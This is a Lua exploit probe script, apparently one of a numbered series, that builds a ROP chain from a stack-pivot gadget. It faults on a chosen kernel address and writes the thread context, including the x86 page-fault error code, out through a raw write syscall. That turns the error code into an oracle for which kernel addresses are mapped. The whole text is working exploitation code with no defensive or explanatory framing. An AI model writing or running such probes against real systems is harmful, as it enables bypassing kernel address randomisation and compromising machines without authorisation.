-- CRASH_CLASS: HIGH
-- PROBE 996a: the fault error code is the class discriminator — compact oracle
--
-- 995a dumped the thread context for two faulting addresses and the fields that
-- tracked the address class were +0xD8 (5 for 0xFFFFFFFF80000000, 4 for an unmapped
-- user address) and +0x130 (0x50E against 0x40E): the x86 #PF error code with trap
-- number 0x0E in the low byte. P=1 in that code means the page is present, so a
-- kernel address answering 5 is mapped while 4 is not.
--
-- This run writes 0x100 bytes from the context at +0xC0, which covers both fields, so
-- one connection answers one address.

local TARGET = 0xFFFFFFFFC0000000

print("=== PROBE 996a: FAULT CODE ORACLE ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function as_addr(t) local s=tostring(t) local m=s:match("0x(%x+)") if m then return tonumber(m,16) end return to_num(t) end

print(string.format("[A] target=0x%X", TARGET))
local ph = gadgets.stack_pivot[1]
local pivot_addr = to_num(ph.pivot_addr)
print(string.format("[B] pivot=0x%X", pivot_addr))

local ctxt = memory.alloc(8)
local chain = ropchain({ stack_base = pivot_addr })
chain:push_store_rdx_into_memory(ctxt)
chain:push_syscall_raw(syscall.write, function()
    chain:push_set_rdx(0x100)
    chain:push_set_rax_from_memory(ctxt)
    chain:push_add_to_rax(0xC0)
    chain:push_set_reg_from_rax("rsi")
    chain:push_set_reg_from_memory("rdi", signal.fd_addr)
end)
print("[C] chain built, faulting")
local ok = pcall(function() return memory.read_qword(TARGET) end)
print(string.format("[D] returned ok=%s", tostring(ok)))
